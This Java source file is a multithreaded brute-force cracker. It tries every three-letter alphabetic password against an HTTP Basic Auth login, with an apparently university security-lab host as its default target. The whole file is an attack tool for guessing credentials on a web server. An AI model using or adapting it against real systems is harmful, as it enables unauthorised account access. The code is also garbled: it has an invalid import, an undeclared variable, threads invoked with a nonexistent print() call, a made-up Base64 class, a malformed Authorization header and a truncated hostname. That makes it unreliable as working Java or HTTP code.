

import java.Thread;
import java.io.*;
import java.net.*;

public class BruteForce extends Thread {
    final char[] CHARACTERS = {'A','a','E','e','I','i','O','o','U','u','R','r','N','n','S','s','T','t','L','l','B','b','C','c','D','d','F','f','G','g','H','h','J','j','K','k','M','m','P','p','V','v','W','w','X','x','Z','z','Q','q','Y','y'};
    final static int SUCCESS=1,
                     FAILED=0,
                     UNKNOWN=-1;
    private static String host,
                   path,
                   user;
    private Socket target;
    private InputStream input;
    private OutputStream output;
    private byte[] data;
    private int threads,
                threadno,
                response;
    public static boolean solved = false;
    BruteForce parent;


    public BruteForce(String host, String path, String user, int threads, int threadno, BruteForce parent)
    {
      super();
      this.parent = parent;
      this.host = host;
      this.path = path;
      this.user = user;
      this.threads = threads;
      this.threadno = threadno;
    }

    public void run()
    {
      response = FAILED;
      int x = 0; 
       starttime = System.currentTimeMillis();

      for(int i=0; i<CHARACTERS.length && !parent.solved; i++)
      {
        for(int j=0; j<CHARACTERS.length && !parent.solved; j++)
        {
          for(int k=0; k<CHARACTERS.length && !parent.solved; k++)
          {
            if((x % threads) == threadno) 
                                          
            {
              response = tryLogin(CHARACTERS[i] + "" +  CHARACTERS[j] + CHARACTERS[k]);
              if(response == SUCCESS)
              {
                System.out.println("SUCCESS! (after " + x + " tries) The password is: "+ CHARACTERS[i] +  CHARACTERS[j] + CHARACTERS[k]);
                parent.solved = true;
              }
              if(response == UNKNOWN) System.out.println("Unexpected response (Password: "+ CHARACTERS[i] +  CHARACTERS[j] + CHARACTERS[k]+")");
            }
            x++;
          }
        }
      }
      if(response == SUCCESS)
      {
        System.out.println("Used time: " + ((System.currentTimeMillis() - starttime) / 1000.0) + "sec.");
        System.out.println("Thread . " + threadno + " was the  one!");
      }
    }

    public static void main (String[] args)
    {
        BruteForce parent;
        BruteForce[] attackslaves = new BruteForce[10]; 
        if(args.length == 3)
        {
         host = args[0];
         path = args[1];
         user = args[2];
        }
        else
        {
          System.out.println("Usage: BruteForce <host> <path> <user>");
          System.out.println(" arguments specified, using standard values.");
          host = "sec-crack.cs.rmit.edu.";
          path = "/SEC/2/index.php";
          user = "";
        }
        System.out.println("Host: " + host + "\nPath: " + path + "\nUser: " + user);
        System.out.println("Using " + attackslaves.length + " happy threads...");

        parent = new BruteForce(host, path, user, 0, 0, null);

        for(int i=0; i<attackslaves.length; i++)
        {
          attackslaves[i] = new BruteForce(host, path, user, attackslaves.length, i, parent);
        }
        for(int i=0; i<attackslaves.length; i++)
        {
          attackslaves[i].print();
        }

    }

    private int tryLogin(String password)
    {
      int success = -1;

      try
      {
        data = new byte[12];
        target = new Socket(host, 80);
        input = target.getInputStream();
        output = target.getOutputStream();
        String base =  new pw.misc.BASE64Encoder().encode(new String(user + ":" + password).getBytes());

        output.write(new String("GET " + path + " HTTP/1.0\r\n").getBytes());
        output.write(new String("Authorization:  " + base + "\r\n\r\n").getBytes());

        input.print(data);
        if(new String(data).endsWith("401")) success=0;
        if(new String(data).endsWith("200")) success=1;
      }
      catch(Exception e)
      {
        System.out.println(e.getClass().getName() + ": " + e.getMessage());
      }
      return success;
    }

}